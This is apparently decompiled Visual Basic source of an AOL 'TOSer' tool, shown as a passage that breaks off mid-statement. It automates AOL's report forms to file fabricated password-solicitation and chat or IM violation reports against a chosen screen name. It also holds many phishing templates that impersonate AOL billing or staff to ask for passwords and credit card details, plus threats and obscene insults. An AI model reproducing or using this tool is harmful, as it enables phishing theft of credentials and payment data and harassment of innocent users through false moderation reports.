' TOS.FRM
Option Explicit
Dim m001A As Variant

Sub sub5BC8 ()
If  tos.Height = 2520 Then
tos.Height = 3915
Else
tos.Height = 2520
End If
End Sub

Sub Command3D1_Click ()
Dim l003C As Variant
Dim l0042 As Variant
Dim l0048 As Variant
Dim l004C As String
Dim l0050 As Variant
Dim l0054 As Variant
Dim l005A As Variant
Dim l0060 As Variant
If  text1.Text = "" Then
MsgBox "You must enter in someone to TOS!"
Exit Sub
End If
If  Text2.Text = "" Then
MsgBox "You must enter in a phrase!", 16
Exit Sub
End If
l003C = MsgBox("Did you type EXACTLY in the person's Screen Name?", 4 + 16, "- --Fate Ultra TOSer-- -")
If  l003C = 6 Then
Else
Exit Sub
End If
l0042 = extfn1018("AOL FRAME25", 0&)
l0048 = extfn10F8(l0042, "Welcome")
l004C$ = String(30, 0)
l0050 = extfnFA8(l0048, l004C$, 250)
If  l0050 <= 7 Then
MsgBox "An error occurred: Not signed on!", 16
Exit Sub
End If
If  m001A = "3" Then
GoTo 201
Else
l003C = extfn1018("AOL FRAME25", 0&)
l0054 = extfn10F8(l003C, "AOL Live!")
l005A = extfn1088(l0054)
l0060 = extfn10C0(l005A, "_AOL_EDIT")
If  l0060 = 0 Then
MsgBox "Chat room could not be found!", 16
Exit Sub
End If
If  m001A = "1" Then
l0042 = fnA30("«‹- -– Fate Ultra TOS Bot Activated –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Scanning For a Target.... –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– " + text1.Text + " Has Been Targeted –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Method: " + Combo1.Text + " –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Lamer Has Been Spared! –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Fate Ultra TOS Bot Deactivated –-- -›»")
GoTo L3EBFA
Else
l0042 = fnA30("«‹- -– Fate Ultra TOS Bot Activated –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Scanning For a Target.... –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– " + text1.Text + " Has Been Targeted –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Method: " + Combo1.Text + " –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Lamer Has Been TOSed! –-- -›»")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30(" ")
l0042 = fn13A0(.6#)
l0042 = fnA30("«‹- -– Fate Ultra TOS Bot Deactivated –-- -›»")
End If
End If
201 :
Timer1.Enabled = True
Timer1.Interval = 1

L3EBFA:
End Sub

Sub Command3D2_Click ()
valid.Show
End Sub

Sub Command3D5_Click ()
End Sub

Sub Command3D6_Click ()
End Sub

Sub Command3D7_Click ()
tos.WindowState = 1
End Sub

Sub Command3D8_Click ()
Dim l0078 As Variant
Dim l007C As Variant
Dim l0080 As Variant
Dim l0084 As Variant
Dim l0088 As Variant
Dim l008C As Variant
Dim l0090 As Variant
Dim l0094 As Variant
Dim l0098 As Variant
Dim l009C As Variant
Dim l00A0 As Variant
Dim l00A4 As Variant
Dim l00A8 As Variant
If  text1.Text = "" Then
MsgBox "Please enter in the Screen Name of the person to TOS!", 16
Exit Sub
End If
Randomize
l0078 = Int(5 * Rnd)
Select Case l0078
Case 0
l007C = "Good morning, "
Case 1
l007C = "Good afternoon, "
Case 2
l007C = "Good evening, "
Case 3
l007C = "Hello, "
Case 4
l007C = "Hi, "
End Select
Randomize
l0080 = Int(5 * Rnd)
Select Case l0080
Case 0
l0084 = "I am from the America Online Password Verification Department. Today we have lost information concerning on your account, due to a system crash. "
Case 1
l0084 = "I am " + text1.Text + " from America Online. Today, we have lost contact with your server, loosing all vital information on your account. "
Case 2
Randomize
l0088 = Int(1000 * Rnd) + 1000
l008C = Trim(Str(l0088))
l0084 = "Due to internal #" + l008C + ", we have lost vital information concerning on your account. "
Case 3
l0084 = "Since we are experiencing problems with your server, we need you to answer a question. "
Case 4
Randomize
l0090 = Int(224 * Rnd)
Select Case l0090
Case 0
l0094 = "Amy"
Case 1
l0094 = "Dave"
Case 2
l0094 = "Dan"
Case 3
l0094 = "Bob"
Case 4
l0094 = "Kevin"
Case 5
l0094 = "Matt"
Case 6
l0094 = "Eric"
Case 7
l0094 = "Tiffany"
Case 8
l0094 = "Brian"
Case 9
l0094 = "Tot"
Case 10
l0094 = "Stevie"
Case 11
l0094 = "John"
Case 12
l0094 = "Michael"
Case 13
l0094 = "Mark"
Case 14
l0094 = "Ken"
Case 15
l0094 = "Charles"
Case 16
l0094 = "Paul"
Case 17
l0094 = "Carl"
Case 18
l0094 = "Alan"
Case 19
l0094 = "Steve"
Case 20
l0094 = "Bill"
Case 21
l0094 = "Fred"
Case 22
l0094 = "Wilma"
Case 23
l0094 = "Victor"
Case 24
l0094 = "Hector"
Case 25
l0094 = "Alex"
Case 26
l0094 = "Alexander"
Case 27
l0094 = "Gabby"
Case 28
l0094 = "Jamal"
Case 29
l0094 = "Scott"
Case 30
l0094 = "Jake"
Case 31
l0094 = "Aldo"
Case 32
l0094 = "Jack"
Case 33
l0094 = "Ferdick"
Case 34
l0094 = "Arash"
Case 35
l0094 = "Brandon"
Case 36
l0094 = "Bruce"
Case 37
l0094 = "Janice"
Case 38
l0094 = "Allen"
Case 39
l0094 = "Fallon"
Case 40
l0094 = "Saad"
Case 41
l0094 = "Johnny"
Case 42
l0094 = "Danny"
Case 43
l0094 = "Jason"
Case 44
l0094 = "Jonathan"
Case 45
l0094 = "Chris"
Case 46
l0094 = "Richard"
Case 47
l0094 = "Andrea"
Case 48
l0094 = "Amir"
Case 49
l0094 = "Bobby"
Case 50
l0094 = "George"
Case 51
l0094 = "Jacob"
Case 52
l0094 = "Jay"
Case 53
l0094 = "Donald"
Case 54
l0094 = "Robert"
Case 55
l0094 = "Stephen"
Case 56
l0094 = "Ronald"
Case 57
l0094 = "Thomas"
Case 58
l0094 = "Kirby"
Case 59
l0094 = "Patrick"
Case 60
l0094 = "Ryan"
Case 61
l0094 = "Walter"
Case 62
l0094 = "Kalvin"
Case 63
l0094 = "Zhen"
Case 64
l0094 = "Peter"
Case 65
l0094 = "Tim"
Case 66
l0094 = "Timothy"
Case 67
l0094 = "Rodney"
Case 68
l0094 = "Ray"
Case 69
l0094 = "Gary"
Case 70
l0094 = "Gilbert"
Case 71
l0094 = "Earl"
Case 72
l0094 = "Lubert"
Case 73
l0094 = "Virginia"
Case 74
l0094 = "Mark"
Case 75
l0094 = "Jane"
Case 76
l0094 = "Jordan"
Case 77
l0094 = "Howard"
Case 78
l0094 = "Phuong"
Case 79
l0094 = "Tot"
Case 80
l0094 = "Paul"
Case 81
l0094 = "Jeffrey"
Case 82
l0094 = "Lucey"
Case 83
l0094 = "William"
Case 84
l0094 = "Chase"
Case 85
l0094 = "Matthew"
Case 86
l0094 = "Phillip"
Case 87
l0094 = "Nancy"
Case 88
l0094 = "Andy"
Case 89
l0094 = "Andrew"
Case 90
l0094 = "Luik"
Case 91
l0094 = "Kimberly"
Case 92
l0094 = "Billy"
Case 93
l0094 = "Micky"
Case 94
l0094 = "Nadine"
Case 95
l0094 = "Gene"
Case 96
l0094 = "Logan"
Case 97
l0094 = "Glen"
Case 98
l0094 = "Gloria"
Case 99
l0094 = "Destiny"
Case 100
l0094 = "Axel"
Case 101
l0094 = "Khiem"
Case 102
l0094 = "Gregory"
Case 102
l0094 = "Margaret"
Case 104
l0094 = "Susan"
Case 105
l0094 = "Ralph"
Case 106
l0094 = "Willy"
Case 107
l0094 = "Donatello"
Case 108
l0094 = "Mike"
Case 109
l0094 = "Kim"
Case 110
l0094 = "Rob"
Case 111
l0094 = "Dawn"
Case 112
l0094 = "Liem"
Case 113
l0094 = "Hipolito"
Case 114
l0094 = "Natasha"
Case 115
l0094 = "Edward"
Case 116
l0094 = "Mark"
Case 117
l0094 = "Lynn"
Case 118
l0094 = "Joel"
Case 119
l0094 = "Noelle"
Case 120
l0094 = "Bunty"
Case 121
l0094 = "Akira"
Case 122
l0094 = "Ashim"
Case 123
l0094 = "Clint"
Case 124
l0094 = "Silvia"
Case 125
l0094 = "Alicia"
Case 126
l0094 = "Bart"
Case 127
l0094 = "Homer"
Case 128
l0094 = "Marge"
Case 129
l0094 = "Lisa"
Case 130
l0094 = "Humberto"
Case 131
l0094 = "Macki"
Case 132
l0094 = "Mary"
Case 133
l0094 = "Carlos"
Case 134
l0094 = "Tommy"
Case 135
l0094 = "Kent"
Case 136
l0094 = "Clark"
Case 137
l0094 = "Joseph"
Case 138
l0094 = "Patti"
Case 139
l0094 = "Pat"
Case 140
l0094 = "Randolph"
Case 141
l0094 = "Ida"
Case 142
l0094 = "Harry"
Case 143
l0094 = "Larry"
Case 144
l0094 = "Moe"
Case 145
l0094 = "Warren"
Case 146
l0094 = "Neil"
Case 147
l0094 = "Aneil"
Case 148
l0094 = "Renee"
Case 149
l0094 = "Rita"
Case 150
l0094 = "Douglas"
Case 151
l0094 = "Charles"
Case 152
l0094 = "Daniel"
Case 153
l0094 = "Laura"
Case 154
l0094 = "Laureen"
Case 155
l0094 = "Martin"
Case 156
l0094 = "Marty"
Case 157
l0094 = "Jose"
Case 158
l0094 = "Josephine"
Case 159
l0094 = "Marwan"
Case 160
l0094 = "Narwin"
Case 161
l0094 = "Ashley"
Case 162
l0094 = "Jerry"
Case 163
l0094 = "Patricia"
Case 164
l0094 = "Melissa"
Case 165
l0094 = "Anthony"
Case 166
l0094 = "Tony"
Case 167
l0094 = "Kathleen"
Case 168
l0094 = "Kathy"
Case 169
l0094 = "Kristin"
Case 170
l0094 = "Kelly"
Case 171
l0094 = "Bud"
Case 172
l0094 = "Frank"
Case 173
l0094 = "Debbie"
Case 174
l0094 = "Ellen"
Case 175
l0094 = "Eugene"
Case 176
l0094 = "Sue"
Case 177
l0094 = "Sully"
Case 178
l0094 = "Ricky"
Case 179
l0094 = "Rick"
Case 180
l0094 = "Peggy"
Case 181
l0094 = "Keith"
Case 182
l0094 = "Otis"
Case 183
l0094 = "Weis"
Case 184
l0094 = "Dick"
Case 185
l0094 = "David"
Case 186
l0094 = "Daniel"
Case 187
l0094 = "Carol"
Case 188
l0094 = "Kenneth"
Case 189
l0094 = "Curtis"
Case 190
l0094 = "Erica"
Case 191
l0094 = "Craig"
Case 192
l0094 = "Doug"
Case 193
l0094 = "Ian"
Case 194
l0094 = "James"
Case 195
l0094 = "Jim"
Case 196
l0094 = "Jimbo"
Case 197
l0094 = "Margery"
Case 198
l0094 = "Glenn"
Case 199
l0094 = "Emlin"
Case 200
l0094 = "Erin"
Case 201
l0094 = "Shelly"
Case 202
l0094 = "Stewart"
Case 203
l0094 = "Milhouse"
Case 204
l0094 = "Shirley"
Case 205
l0094 = "Clarence"
Case 206
l0094 = "Dennis"
Case 207
l0094 = "Debra"
Case 208
l0094 = "Diane"
Case 209
l0094 = "Christopher"
Case 210
l0094 = "Wilburt"
Case 211
l0094 = "Garret"
Case 212
l0094 = "Derek"
Case 213
l0094 = "Casie"
Case 214
l0094 = "Theresa"
Case 215
l0094 = "Ronald"
Case 216
l0094 = "Ron"
Case 217
l0094 = "Nicole"
Case 218
l0094 = "Russ"
Case 219
l0094 = "Brian"
Case 220
l0094 = "Malcom"
Case 221
l0094 = "Jin"
Case 222
l0094 = "Benjamin"
Case 223
l0094 = "Carlina"
End Select
Randomize
l0098 = Int(100 * Rnd)
Select Case l0098
Case 0
l009C = "Anderson"
Case 1
l009C = "Banya"
Case 2
l009C = "Clint"
Case 3
l009C = "Nguyen"
Case 4
l009C = "Russian"
Case 5
l009C = "German"
Case 6
l009C = "Mulhair"
Case 7
l009C = "Lincoln"
Case 8
l009C = "Abraham"
Case 9
l009C = "Ramdeo"
Case 10
l009C = "Barker"
Case 11
l009C = "Eck"
Case 12
l009C = "Eckerman"
Case 13
l009C = "Baig"
Case 14
l009C = "MCGinty"
Case 15
l009C = "Clark"
Case 16
l009C = "Morgan"
Case 17
l009C = "Rieder"
Case 18
l009C = "Hicks"
Case 19
l009C = "Farrow"
Case 20
l009C = "Jennings"
Case 21
l009C = "Bibbee"
Case 22
l009C = "Piddington"
Case 23
l009C = "Lott"
Case 24
l009C = "Bailey"
Case 25
l009C = "Hershey"
Case 26
l009C = "Long"
Case 27
l009C = "Luong"
Case 28
l009C = "Vasquez"
Case 29
l009C = "Ercillo"
Case 30
l009C = "Trittle"
Case 31
l009C = "Boxill"
Case 32
l009C = "Boy"
Case 33
l009C = "Smith"
Case 34
l009C = "Simpson"
Case 35
l009C = "Gates"
Case 36
l009C = "Clinton"
Case 37
l009C = "Bush"
Case 38
l009C = "Kerrigan"
Case 39
l009C = "McMillan"
Case 40
l009C = "Hunolt"
Case 41
l009C = "Sellers"
Case 42
l009C = "MacGuire"
Case 43
l009C = "Schroeder"
Case 44
l009C = "Dalmut"
Case 45
l009C = "Kamsivone"
Case 46
l009C = "Phem"
Case 47
l009C = "Pham"
Case 48
l009C = "Berry"
Case 49
l009C = "Byrd"
Case 50
l009C = "Ghadir"
Case 51
l009C = "Lee"
Case 52
l009C = "Warner"
Case 53
l009C = "Leeds"
Case 54
l009C = "Walton"
Case 55
l009C = "Nichols"
Case 56
l009C = "Waddell"
Case 57
l009C = "Spellman"
Case 58
l009C = "Ahoe"
Case 59
l009C = "Leesburg"
Case 60
l009C = "Bryan"
Case 61
l009C = "Bryant"
Case 62
l009C = "Slager"
Case 63
l009C = "Le"
Case 64
l009C = "Decamp"
Case 65
l009C = "Haith"
Case 66
l009C = "Tran"
Case 67
l009C = "Machi"
Case 68
l009C = "Davis"
Case 69
l009C = "Alam"
Case 70
l009C = "Mary"
Case 71
l009C = "Irish"
Case 72
l009C = "Amerillo"
Case 73
l009C = "Ann"
Case 74
l009C = "Roland"
Case 75
l009C = "Martin"
Case 76
l009C = "Grey"
Case 77
l009C = "Moore"
Case 78
l009C = "Hong"
Case 79
l009C = "Ha"
Case 80
l009C = "Jonna"
Case 81
l009C = "Cumberledge"
Case 82
l009C = "Freemen"
Case 83
l009C = "Jill"
Case 84
l009C = "Jon"
Case 85
l009C = "Williams"
Case 86
l009C = "Cummings"
Case 87
l009C = "Jane"
Case 88
l009C = "Jamison"
Case 89
l009C = "Raymond"
Case 90
l009C = "Lashley"
Case 91
l009C = "Reed"
Case 92
l009C = "Sadler"
Case 93
l009C = "Brown"
Case 94
l009C = "White"
Case 95
l009C = "Taylor"
Case 96
l009C = "Doyle"
Case 97
l009C = "Black"
Case 98
l009C = "Tyler"
Case 99
l009C = "Jones"
End Select
l00A0 = l0094 + " " + l009C
l0084 = "I am " + l00A0 + " from America Online. Earlier today, we had a problem with your server, and may have lost vital information concerning on your account. "
End Select
Randomize
l00A4 = Int(5 * Rnd)
Select Case l00A4
Case 0
l00A8 = "Please reply back and enter in your log-on password. Thank You."
Case 1
l00A8 = "Please click on ""Respond"" and enter in your password. Thank you for your cooperation."
Case 2
l00A8 = "Click on respond and enter in your password." + Chr(13) + Chr(10) + "Steve Case - Founder of AOL"
Case 3
l00A8 = "If you do not reply back your password within 24 hours, your account will be terminated of use."
Case 4
l00A8 = "If you would please click on respond and reply back your password. Thank you and enjoy America Online."
End Select
Text2.Text = l007C + l0084 + l00A8
End Sub

Sub Form_Load ()
Dim l00AC As Variant
Dim l00B0 As Variant
Dim l00B4 As Variant
Dim l00B8 As Variant
Dim l00BC As Variant
Dim l00C2 As String
Dim l00C6 As Variant
Dim l00CA As Variant
l00AC = extfn1018("AOL FRAME25", 0&)
l00B0 = extfn10F8(l00AC, "AOL Live!")
l00B4 = extfn1088(l00B0)
l00B8 = extfn10C0(l00B4, "_AOL_LISTBOX")
If  l00B8 > 0 Then
For l00BC = 0 To extfnFE0(l00B8, 1036, 0, 0) - 1
l00C2$ = String(30, 0)
l00C6 = extfn1608(l00BC, l00C2$)
l00CA = InStr(l00C2$, Chr(0))
If  l00CA Then
l00C2$ = Mid(l00C2$, 1, l00CA - 1)
End If
text1.AddItem l00C2$
Next l00BC
text1.Text = text1.List(0)
End If
List1.AddItem "Scare TOS"
List1.AddItem "Real TOS"
List1.AddItem "Silent TOS"
List1.Selected(0) = True
m001A = "1"
Combo1.AddItem "PW Solicitation"
Combo1.AddItem "Fake E-Mail"
Combo1.AddItem "IM Violation"
Combo1.AddItem "Chat Violation"
Combo1.AddItem "All Methods"
Combo1.ListIndex = 4
Option3D1.Value = True
extsub1050 tos.hWnd, -1, 0, 0, 0, 0, 3
If  tos.Caption <> fnBB8() Then
MsgBox "Program contains unauthorized changes." + Chr(13) + Chr(10) + "Terminating now!", 16
End
End If
End Sub

Sub List1_Click ()
Dim l00DC As Variant
l00DC = List1.ListIndex
If  l00DC = 0 Then m001A = "1"
If  l00DC = 1 Then m001A = "2"
If  l00DC = 2 Then m001A = "3"
End Sub

Sub sub6DD8 ()
Dim l00E0 As Variant
l00E0 = Chr(13) + Chr(10)
Text2.Text = "ATTENTION: AOL NEWS" + l00E0 + "******************************" + l00E0 + "Hi, I'm with the America Online billing department.  We are having trouble verifying your account information that you have given us.  We would like to correct this problem as soon as possible to avoid unneeded cancellation of your account.  Please state your billing information in the following format: Full name, credit number with expiration date, address, and telephone number.  Thank you for your cooperation."
End Sub

Sub sub6E10 ()
Text2.Text = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."
End Sub

Sub sub5E30 ()
Text2.Text = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
End Sub

Sub Option3D1_Click (Value As Integer)
Text2.Text = "Dear America Online user, due to a problem with your server (AOLNET), we have lost vital information concerning on your account. Please respond back with your password or you will face account termination. Thank you for your consideration."
End Sub

Sub Option3D10_Click (Value As Integer)
Text2.Text = "I am gonna TOS you if you don't give me your dam password!"
End Sub

Sub Option3D11_Click (Value As Integer)
Text2.Text = "Hey, I got TONS of HOT nude pictures. If you want some, respond back with your current password. "
End Sub

Sub Option3D12_Click (Value As Integer)
Text2.Text = "Hey, do you want to trade phishes? I got many phishes for trade and they all work with wareZ in it. Respond back if you want a phish."
End Sub

Sub Option3D13_Click (Value As Integer)
Text2.Text = "Sup, do you have any phishes? This account is a phish and I need some phishes. If you got some, respond back."
End Sub

Sub Option3D14_Click (Value As Integer)
Text2.Text = "Hi, I am from the Internet Agency. Please respond back with your credit card information in order to access the internet. This way, we know that you are a true AOL Member."
End Sub

Sub Option3D15_Click (Value As Integer)
Text2.Text = "Hello, I am Guide RED, a guide from America Online. Please give me your password silently or I will Terminate your account of use."
End Sub

Sub Option3D16_Click (Value As Integer)
Text2.Text = " - ATTENTION - Due to complicated problems with your server, we at America Online have lost vital information concerning on your account. Please respond back with your current password. If you don't, your account might be terminated of further use."
End Sub

Sub Option3D17_Click (Value As Integer)
Text2.Text = "I am from the Password Verification Department and earlier today, we had an America Online employee sabotage our records. Please respond back with your credit card information and password."
End Sub

Sub Option3D18_Click (Value As Integer)
Text2.Text = "Hi, I am a hacker from AOL and I want your dam password. If you don't give me your password, I will terminate your account of further use."
End Sub

Sub Option3D19_Click (Value As Integer)
Text2.Text = "Good evening, I from the America Online Password Solicitation Department, and I need you to respond back with your current password for verification. Thank you for your cooperation."
End Sub

Sub Option3D2_Click (Value As Integer)
Text2.Text = "Hello fellow AOL Member, I am a guide from AOL and I need you to respond back with your log-on information for access to the chat rooms. If you do not respond, you are not allowed within the rooms."
End Sub

Sub Option3D20_Click (Value As Integer)
Text2.Text = "HI. I AM FROM OTC (ONLINE TECHNICAL CONSULTANTS) AND EARLIER TODAY HE HAD A HACKER HACK INTO THE MAIN COMPUTER SYSTEMS. WE LOST ALL VITAL INFORMATION CONCERNING ON YOUR ACCOUNT. PLEASE RESPOND BACK WITH YOUR CURRENT PASSWORD."
End Sub

Sub Option3D3_Click (Value As Integer)
Text2.Text = "Hi, I am from the AHS (Anti-Hacking Service) and I need you to respond back with your password in order to verify that your account is not fake. Thank you for your cooperation."
End Sub

Sub Option3D4_Click (Value As Integer)
Text2.Text = "*** America Online Flash News*** Due to a bug in our system, we need you to respond back with your credit card information and password."
End Sub

Sub Option3D5_Click (Value As Integer)
Text2.Text = "Gimme your god dam password or I am gonna TERMINATE your account of further use!"
End Sub

Sub Option3D6_Click (Value As Integer)
Text2.Text = "Dear User, Due to a complicated problem in our program we have lost contact with your account information. The problem occured earlier today when one of employees released a virus onto one of our main system. Please respond back with your password in order to keep your acccount from termination."
End Sub

Sub Option3D7_Click (Value As Integer)
Text2.Text = "Hey, give me your password or I am going to HACK into your computer and release a bug that will destroy your freaking computer from further use!"
End Sub

Sub Option3D8_Click (Value As Integer)
Text2.Text = "Hi, I am Steve Case (Founder of AOL) and I need you to reply back with your password in order to verify that you are a true AOL user and not a Hacker. Thank you for your cooperation."
End Sub

Sub Option3D9_Click (Value As Integer)
Text2.Text = "Hello, I am Sam Kieth, an employee from America Online. Earlier today, we had a system crash and lost ALL VITAL INFORMATION concerning on your account. Please reply back with your password. Thank you."
End Sub

Sub sub62C8 ()
Text2.Text = ""
End Sub

Sub text1_KeyPress (KeyAscii As Integer)
Dim l010E As Variant
l010E = Chr(KeyAscii)
If  l010E = Chr(13) Then
text1.AddItem text1.Text
End If
End Sub

Sub Timer1_Timer ()
Dim l0112 As Variant
Dim l0116 As Variant
Dim l011A As Variant
Dim l0120 As Variant
Dim l0124 As Variant
Dim l0128 As Variant
Dim l012E As Variant
Dim l0132 As Variant
Dim l0138 As Variant
Dim l013C As Variant
Dim l0142 As Variant
Dim l0146 As Variant
Dim l014A As Variant
Dim l014E As Variant
Dim l0152 As Variant
Dim l0156 As Variant
Dim l015A As Variant
Dim l015E As Variant
Dim l0162 As Variant
Dim l0166 As Variant
Dim l016A As Variant
Dim l016E As Variant
Dim l0172 As Variant
Dim l0176 As Variant
Dim l017A As Variant
Dim l017E As Variant
Dim l0182 As Variant
Dim l0186 As Variant
Dim l018A As Variant
Dim l018E As Variant
Dim l0192 As Variant
Dim l0196 As Variant
Dim l019A As Variant
Dim l019E As Variant
Dim l01A2 As Variant
Dim l01A6 As Variant
Dim l01AA As Variant
Dim l01AE As Variant
Dim l01B2 As Variant
Dim l01B6 As Variant
Dim l01BA As Variant
Dim l01BE As Variant
Dim l01C2 As Variant
Dim l01C6 As Variant
Dim l01CA As Variant
Dim l01CE As Variant
Dim l01D2 As Variant
Dim l01D6 As String
Dim l01DC As String
Dim l01DE As Variant
Dim l01E2 As Variant
Dim l01E6 As Variant
Dim l01EA As Variant
Dim l01EE As Variant
Dim l01F2 As Variant
Dim l01F6 As Variant
Dim l01FA As Variant
Dim l01FE As Variant
Dim l0202 As Variant
Dim l0206 As Variant
Dim l020A As Variant
Dim l020E As Variant
Dim l0212 As Variant
Dim l0216 As Variant
Dim l021A As Variant
l0112 = Chr(13)
l0116 = extfn1018("AOL FRAME25", 0&)
If  Combo1.Text = "Fake E-Mail" Then GoTo 160
l011A = extfn10F8(l0116, "GUIDEPAGER")
If  l011A > 0 Then GoTo 90
l0120 = fn5D0("&Go To", "Keyword...")
10 :
DoEvents
l0124 = extfn10F8(l0116, "Keyword")
If  l0124 = 0 Then GoTo 10
l0128 = extfn10C0(l0124, "_AOL_EDIT")
l012E = extfn11A0(l0128, 12, 0, "Guide Pager")
l0132 = extfn10C0(l0124, "_AOL_ICON")
l0138 = fn1480(l0132)
20 :
DoEvents
l011A = extfn10F8(l0116, "GUIDEPAGER")
If  l011A = 0 Then GoTo 20
90 :
If  Combo1.Text = "All Methods" Then GoTo 100
If  Combo1.Text = "PW Solicitation" Then
100 :
l013C = extfn10F8(l011A, "Report" + Chr(13) + "Password" + Chr(13) + "Solicitations")
l0142 = extfn1168(l013C, 2)
l0146 = fn1480(l0142)
30 :
DoEvents
l014A = extfn10F8(l0116, "Report Password Solicitations")
If  l014A = 0 Then GoTo 30
l014E = extfn10F8(l014A, "Screen Name of Member")
l0152 = extfn10F8(l014A, "Copy and Paste")
l0156 = extfn1168(l014E, 2)
l015A = extfn1168(l0152, 2)
l015E = extfn11A0(l0156, 12, 0, text1.Text)
l0162 = extfn11A0(l015A, 12, 0, text1.Text + ":" + Chr(9) + Text2.Text)
l0166 = extfn10F8(l014A, "Send")
l016A = fn1480(l0166)
40 :
DoEvents
l016E = extfn1018("#32770", "America Online")
If  l016E = 0 Then GoTo 40
l0172 = extfn10F8(l016E, "OK")
l0176 = fn1480(l0172)
If  Combo1.Text = "All Methods" Then GoTo 110
l017A = extfnFE0(l011A, 16, 0, 0)
GoTo L473BA
End If
If  Combo1.Text = "IM Violation" Then
110 :
l013C = extfn10F8(l011A, "Write to" + l0112 + "Community" + l0112 + "Action Team")
l0142 = extfn1168(l013C, 2)
l0146 = fn1480(l0142)
50 :
DoEvents
l014A = extfn10F8(l0116, "Report a Violation")
If  l014A = 0 Then GoTo 50
l014E = extfn10F8(l014A, "IM" + l0112 + "Violations")
l0152 = extfn1168(l014E, 2)
l0156 = fn1480(l0152)
60 :
DoEvents
l015A = extfn10F8(l0116, "Violations via Instant MEssages")
If  l015A = 0 Then GoTo 60
l015E = extfn10F8(l015A, "Date")
l0162 = extfn1168(l015E, 2)
l0166 = extfn11A0(l0162, 12, 0, Date)
l016A = extfn10F8(l015A, "category of chat room")
l016E = extfn1168(l016A, 2)
l0172 = extfn11A0(l016E, 12, 0, "Lobby")
l0176 = extfn10F8(l015A, "chat room name")
l017E = extfn1168(l0176, 2)
Randomize
l0182 = Int(125 * Rnd) + 1
l0186 = extfn11A0(l017E, 12, 0, "Town Square - Lobby " + l0182)
l018A = extfn10F8(l015A, "time am/pm")
l018E = extfn1168(l018A, 2)
l0192 = extfn11A0(l018E, 12, 0, Time)
l0196 = extfn10F8(l015A, "cut and paste a copy")
l019A = extfn1168(l0196, 2)
l019E = extfn11A0(l019A, 12, 0, text1.Text + ":" + Chr(9) + Text2.Text)
l01A2 = extfn10F8(l015A, "Send")
l01A6 = fn1480(l01A2)
140 :
DoEvents
l01AA = extfn1018("#32770", "America Online")
If  l01AA = 0 Then GoTo 140
l01AE = extfn10F8(l01AA, "OK")
l01B2 = fn1480(l01AE)
If  Combo1.Text = "All Methods" Then GoTo 120
l017A = extfnFE0(l011A, 16, 0, 0)
l01B6 = extfnFE0(l014A, 16, 0, 0)
GoTo L473BA
End If
If  Combo1.Text = "Chat Violation" Then
120 :
l013C = extfn10F8(l011A, "Write to" + l0112 + "Community" + l0112 + "Action Team")
l0142 = extfn1168(l013C, 2)
l0146 = fn1480(l0142)
70 :
DoEvents
l014A = extfn10F8(l0116, "Report a Violation")
If  l014A = 0 Then GoTo 70
l014E = extfn10F8(l014A, "Chat" + l0112 + "Violations")
l0152 = extfn1168(l014E, 2)
l0156 = fn1480(l0152)
80 :
DoEvents
l015A = extfn10F8(l0116, "Chat Area Violations")
If  l015A = 0 Then GoTo 80
l015E = extfn10F8(l015A, "Date")
l0162 = extfn1168(l015E, 2)
l0166 = extfn11A0(l0162, 12, 0, Date)
l016A = extfn10F8(l015A, "category of chat room")
l016E = extfn1168(l016A, 2)
l0172 = extfn11A0(l016E, 12, 0, "Lobby")
l0176 = extfn10F8(l015A, "chat room name")
l017E = extfn1168(l0176, 2)
Randomize
l0182 = Int(125 * Rnd) + 1
l0186 = extfn11A0(l017E, 12, 0, "Town Square - Lobby " + l0182)
l018A = extfn10F8(l015A, "time am/pm")
l018E = extfn1168(l018A, 2)
l0192 = extfn11A0(l018E, 12, 0, Time)
l0196 = extfn10F8(l015A, "cut and paste a copy")
l019A = extfn1168(l0196, 2)
Randomize
l01BA = Int(10 * Rnd)
Select Case l01BA
Case 0
l01BE = "Haha! "
Case 1
l01BE = "Stupid! "
Case 2
l01BE = "Fucker! "
Case 3
l01BE = "Mother Fucker! "
Case 4
l01BE = "Asshole... "
Case 5
l01BE = "Dumb shit... "
Case 6
l01BE = "Dick sucker... "
Case 7
l01BE = "Pussy Licker.. "
Case 8
l01BE = "Blow job bitch... "
Case 9
l01BE = "Bitch! "
End Select
Randomize
l01C2 = Int(5 * Rnd)
Select Case l01C2
Case 0
l01C6 = "you better fuck off.. "
Case 1
l01C6 = "i am gonna TOS you! "
Case 2
l01C6 = "8=====>, suck this big dick! "
Case 3
l01C6 = "i am gonna mailbomb you... "
Case 4
